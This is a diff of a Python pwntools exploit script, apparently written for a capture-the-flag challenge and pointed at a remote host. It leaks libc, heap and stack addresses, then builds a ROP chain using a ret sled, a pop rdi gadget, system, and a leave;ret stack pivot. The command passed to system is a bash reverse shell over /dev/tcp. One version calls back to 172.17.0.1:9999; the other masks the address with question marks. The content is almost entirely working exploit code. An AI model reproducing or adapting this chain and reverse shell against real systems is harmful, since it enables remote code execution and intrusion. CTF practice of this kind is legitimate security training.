@@ -30,9 +30,10 @@ def get_pw(slot_id):
 def del_pw(slot_id):
     p.sendlineafter("> ", "3")
     p.sendlineafter(":", str(slot_id))
-    
+
 if "remote" in os.environ:
-    p = remote("172.17.0.2", 1234)
+    # p = remote("172.17.0.3", 1234)
+    p = remote("flu.xxx", 10100)
 else:
     p = process("./main")
 
@@ -73,12 +74,13 @@ stack = u64(p.recvline().rstrip().ljust(8, "\x00"))
 print "stack", hex(stack)
 logout()
 
-
 if "remote" in os.environ:
-    leave_ret = libc_base + 0x562ec
+    leave_ret = libc_base + 0x5629c
     ret = leave_ret + 1
-    system = libc_base + 0x000000000050d60
+    system = libc_base + 0x000000000050d70
+    libc_sleep = libc_base + 0x0000000000ea570
     rdi_r = libc_base + 0x2a3e5
+    
 else:
     leave_ret = libc_base + 0x4da83
     ret = leave_ret + 1
@@ -86,15 +88,17 @@ else:
     rdi_r = libc_base + 0x2d8f2
 
 report(''.join([
-    p64(ret) * 0x100,
-    p64(rdi_r), p64(heap_base + 0x1548),
+    p64(ret) * 0x80,
+    # p64(rdi_r), p64(100),
+    # p64(libc_sleep),
+    p64(rdi_r), p64(heap_base + 0x1148),
     p64(system),
-    # offset: 0x1548
-    "bash -c '/bin/bash -i >& /dev/tcp/172.17.0.1/9999 0>&1'",
-    "\x00"
-]).ljust(0xff0, "@"), "Y" * 30)
+    # offset: 0x1148
+    "bash -c '/bin/bash -i >& /dev/tcp/???.???.???.???/????? 0>&1'",
+    "\x00",
+]).ljust(0x500, "@"), "Y" * 30)
 
-pause()
+# pause()
 
 report(''.join([
     "A" * 0x40,
@@ -103,7 +107,7 @@ report(''.join([
     "X", "w" * (35 + 6),           # header (6 for padding)
     p64(stack - 0x3E8), # data
     "\x02",  # SRV_PARSE_DATA
-    p64(heap_base + 0x1500), # stack pivoting
+    p64(heap_base + 0xd80), # stack pivoting
     p64(leave_ret),
 ]).ljust(0x0A40, "@"), "Y" * 32)
 
